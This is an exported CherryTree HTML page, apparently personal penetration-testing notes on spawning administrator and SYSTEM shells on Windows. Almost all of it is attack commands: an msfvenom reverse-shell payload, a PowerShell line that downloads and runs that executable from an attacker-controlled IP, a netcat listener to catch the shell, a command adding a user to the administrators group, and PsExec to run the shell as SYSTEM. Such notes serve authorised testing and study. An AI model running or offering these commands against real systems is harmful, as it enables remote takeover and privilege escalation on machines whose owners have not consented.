<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>How spawn Administrator Shells</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>How spawn Administrator Shells</h1><br/><strong>• msfvenom</strong><br />    If we can execute commands with admin privileges, a reverse shell generated by msfvenom works nicely:<br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># msfvenom -p windows<span style="color:#ff9d00;font-weight:700">/</span>x64<span style="color:#ff9d00;font-weight:700">/</span>shell_reverse_tcp LHOST=192.168.1.11 LPORT=53 -f exe -o reverse.exe<br />attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># python -m SimpleHTTPServer</pre></div><br />    This reverse shell can be caught using netcat or Metasploit’s own multi/handler.<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; (<span style="color:#ff9d00;font-weight:700">New-Object</span> System.Net.WebClient).downloadfile(<span style="color:#333333;font-weight:400">&#39;http://192.168.147.139/reverse.exe&#39;</span>,<span style="color:#333333;font-weight:400">&#39;C:\Users\ckent\Desktop\reverse.exe&#39;</span>);<br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; C<span style="color:#ff9d00;font-weight:700">:\</span>Users<span style="color:#ff9d00;font-weight:700">\</span>ckent<span style="color:#ff9d00;font-weight:700">\</span>Desktop<span style="color:#ff9d00;font-weight:700">\</span>reverse.exe</pre></div><br />    <div class="codebox"><pre>attacker@kali<span style="color:#ff9d00;font-weight:700">:/</span># nc -nvlp 53</pre></div><br />    <a href=""><img src="images/1317-1.png" alt="images/1317-1.png" /></a><br /><strong>• RDP</strong><br />    Alternatively, if RDP is available (or we can enable it), we can add our low privileged user to the administrators group and then spawn an administrator command prompt via the GUI.<br />    <div class="codebox"><pre>PS&gt; net localgroup administrators &lt;username&gt; <span style="color:#ff9d00;font-weight:700">/</span>add</pre></div><br /><strong>• Admin -&gt; SYSTEM</strong><br />    To escalate from an admin user to full SYSTEM privileges, you can use the PsExec tool from Windows Sysinternals (<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">https://docs.microsoft.com/en-us/sysinternals/downloads/psexec</a>).<br />    <div class="codebox"><pre>PS&gt; .<span style="color:#333333;font-weight:400">\P</span>sExec64.exe -a accepteula -i -s C<span style="color:#ff9d00;font-weight:700">:</span><span style="color:#333333;font-weight:400">\P</span>rivEsc<span style="color:#333333;font-weight:400">\r</span>everseShellGenerateWithMsfvenom.exe</pre></div></div>
</body>
</html>
